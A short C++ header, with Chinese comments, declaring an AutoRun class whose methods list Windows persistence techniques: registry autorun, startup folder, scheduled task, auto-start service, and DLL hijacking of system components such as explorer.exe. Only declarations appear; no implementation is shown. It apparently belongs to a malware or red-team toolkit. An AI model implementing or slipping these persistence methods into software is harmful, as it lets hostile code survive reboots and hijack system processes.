#pragma once
#include <Windows.h>
//#include <shlobj_core.h>
#include <stdio.h>
#include<Psapi.h>

class AutoRun
{
public:
	//插入注册表自启
	static BOOL RegAutoRun();
	//StartUp Directory
	static BOOL StartUpFloderAutoRun(char* szTargetFilePath,const char* szAutoRunFileName);
	//创建任务计划启动
	static BOOL TaskScheduleAutoRun();
	//创建自启动系统服务
	static BOOL ServiceStartUp();
	//DLL劫持系统关键自启动组件（explorer.exe...）
	static BOOL DllHijackAutoRun();

};

